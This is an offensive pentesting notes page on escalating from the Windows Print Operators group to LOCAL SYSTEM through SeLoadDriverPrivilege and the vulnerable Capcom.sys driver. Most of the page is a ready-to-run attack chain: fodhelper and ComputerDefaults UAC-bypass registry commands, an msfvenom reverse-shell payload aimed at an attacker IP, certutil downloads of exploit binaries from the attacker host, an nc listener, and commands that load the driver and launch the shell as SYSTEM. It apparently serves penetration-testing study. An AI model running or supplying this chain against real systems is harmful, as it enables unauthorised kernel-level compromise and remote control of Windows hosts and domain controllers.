---
Primary_category: "[[WINDOWS PRIVESC]]"
title: "PRINT OPERATORS"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WINDOWS PRIVESC]]&nbsp;&nbsp;&nbsp;•&nbsp;&nbsp;&nbsp;[[WINDOWS SECURITY GROUPS|SECURITY GROUPS]]

#### *Theory*

The ***Print Operators*** group is another highly privileged group within the ***[[WINDOWS SECURITY GROUPS|Windows Security Groups]]***

A principal who is member of this group has the following rights → 

- ***SeLoadDriverPrivilege assigned to its primary access token***

- ***"Load and unload device drivers" right***

- ***Create, share and delete printers connected to a DC***

- ***Log on locally to a DC***

- ***Shut down a DC***

---

#### *Enumeration*

##### *Listing the Groups to which the Current User belongs*

```bash
whoami /groups
net user <USER>
```

##### *Members of Print Operators*

```bash
net localgroup "Print Operators"
```

---

#### *Code Execution as LOCAL SYSTEM*

##### *Workflow*

As stated, a member of the *Print Operators* group usually has the *seLoadDriverPrivilege* assigned, which allows them to load and unload device drivers on the *Windows Kernel*

> ***Device Drivers operate on Kernel Mode ( Ring 0 )***

Therefore, if we compromise a principal belonging to this group, we can leverage this privilege to load a legitimate but vulnerable driver e.g. ***CAPCOM.sys***, which exposes an interface to run arbitrary code in *Kernel Mode*

Then, we can run an exploit from *Userland ( Ring 3 )* that interacts with the loaded driver in order to gain code execution as *LOCAL SYSTEM*

Since driver loading is a privileged action, the *seLoadDriver* privilege comes always disabled if the current process has a restricted primary token associated

If so, we will need to spawn a new process with a *full primary access token* in order to carry out the mentioned workflow

##### *Requirements*

- ***The controlled user must be a member of the Print Operators group***

- ***The target must be vulnerable to CAPCOM.sys as Microsoft blocked the latter as of Windows 10 Version 1803***

> ***This is because it's no longer possible to include references to registry keys under HKCU***

- ***[[UAC BYPASS|UAC Bypass]] as the process from which the driver is loaded must have a high integrity level i.e. full primary access token***

##### *Abuse - Windows*

###### *Verifying Group Membership*

So first, let's verify that the current user belongs to the *Print Operators* group

```bash
whoami /groups | findstr /I print
```

> [!NOTE]- *Command Output*
>
> ```bash
> BUILTIN\Print Operators                    Alias            S-1-5-32-550 Group used for deny only
> ```
>

###### *Verifying Privileges*

Next, we have to validate that the primary access token associated with the current process has the *seLoadDriver* privilege

```bash
whoami /priv | findstr /I "seload"
```

But it does not

###### *UAC Bypass*

Therefore, in order to have the given privilege assigned, we must spawn a new process with a high integrity level, that is, with a full primary access token assigned to it

To do so, we have to bypass the *User Account Control ( UAC )*

- ***Interactive or RemoteInteractive Logon Session ( Type 2  or 10 )***

***Fodhelper.exe***

```bash
New-Item -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Force | Out-Null
```

```bash
Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name 'DelegateExecute' -Value '' -Type String
```

```bash
Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name '(default)' -Value 'cmd.exe /c start cmd.exe' -Type String
```

```bash
Start-Process 'C:\Windows\System32\fodhelper.exe'
```

***ComputerDefaults.exe***

```bash
New-Item -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Force | Out-Null
```

```bash
Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name '(default)' -Value 'cmd.exe /c start cmd.exe' -Type String
```

```bash
Start-Process 'C:\Windows\System32\ComputerDefaults.exe'
```

- ***Network Session ( Type 3 )***

> ***e.g. WinRM Session or [[SHELLS AND PAYLOADS#Reverse Shell|Reverse Shell]]***

See ***[UACME](https://github.com/hfiref0x/UACME)***

###### *Generating the Reverse Shell Payload*

```bash
msfvenom --payload windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTACKER_PORT> --arch x64 --platform windows --format exe --out <MALICIOUS>.exe
```

###### *Required Binaries Setup*

> ***[Binaries](https://github.com/k4sth4/SeLoadDriverPrivilege)***

- ***Downloading the CAPCOM.sys driver and binaries***

> ***From the attacker*** ⚔️

```bash
curl --silent --location --request GET --remote-name 'https://github.com/k4sth4/SeLoadDriverPrivilege/raw/refs/heads/main/Capcom.sys'
```

```bash
curl --silent --location --request GET --output 'EoPLoadDriver.exe' 'https://github.com/k4sth4/SeLoadDriverPrivilege/raw/refs/heads/main/eoploaddriver_x64.exe'
```

```bash
curl --silent --location --request GET --remote-name 'https://github.com/k4sth4/SeLoadDriverPrivilege/raw/refs/heads/main/ExploitCapcom.exe'
```

- ***Transferring them to the target***

> ***From the attacker*** ⚔️

```bash
python3 -m http.server 80
```

> ***From the target*** 🎯

```bash
mkdir C:\Windows\Temp\LPE
cd C:\Windows\Temp\LPE
```

```bash
certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/Capcom.sys'
certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/EoPLoadDriver.exe'
certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/ExploitCapcom.exe'
certutil.exe -urlcache -split -f 'http://<ATTACKER_IP>/<MALICIOUS>.exe'
```

###### *Setting up a TCP Listener*

> ***From the attacker*** ⚔️

```bash
rlwrap -CaR nc -nlvp <PORT>
```

###### *Loading the CAPCOM.sys Driver*

> ***From the target ( Elevated Process )*** 🎯

> ***[EoPLoadDriver.exe](https://github.com/TarlogicSecurity/EoPLoadDriver)***

The binary below automates the following actions →

- ***It enables `seLoadDriverPrivilege`***

```bash
.\EoPLoadDriver.exe System\CurrentControlSet\Capcom 'C:\Windows\Temp\LPE\Capcom.sys'
```


###### *Running the Exploit*

> ***[ExploitCapcom.exe](https://github.com/tandasat/ExploitCapcom)***

The binary below automates the following actions →

- ***It creates the river-related registry key***

- ***It calls `NtLoadDriver()` to load CAPCOM.sys***

```bash
.\ExploitCapcom.exe LOAD 'C:\Windows\Temp\LPE\Capcom.sys'
```

> ***NTSTATUS: 00000000 → Driver loaded correctly***

- ***It interacts with the CAPCOM.sys Driver interface to run system commands as LOCAL SYSTEM***

***Command***

```bash
.\ExploitCapcom.exe EXPLOIT '<COMMAND>'
```

***Reverse Shell***

```bash
.\ExploitCapcom.exe EXPLOIT 'C:\Windows\Temp\LPE\<MALICIOUS>.exe'
```

##### *Cleanup - Windows*

###### *Unloading the driver*

```bash
.\EoPLoadDriver.exe System\CurrentControlSet\Capcom unload
```

###### *Removing the registry hive used to bypass UAC*

```bash
Remove-Item -Path 'HKCU:\Software\Classes\ms-settings' -Recurse -Force
```

###### *Deleting the uploaded files*

```bash
Remove-Item -Recurse -Force -Path 'C:\Windows\Temp\LPE'
```

---

#### *Resources*

***[Tarlogic: seLoadDriverPrivilege Abuse](https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/)***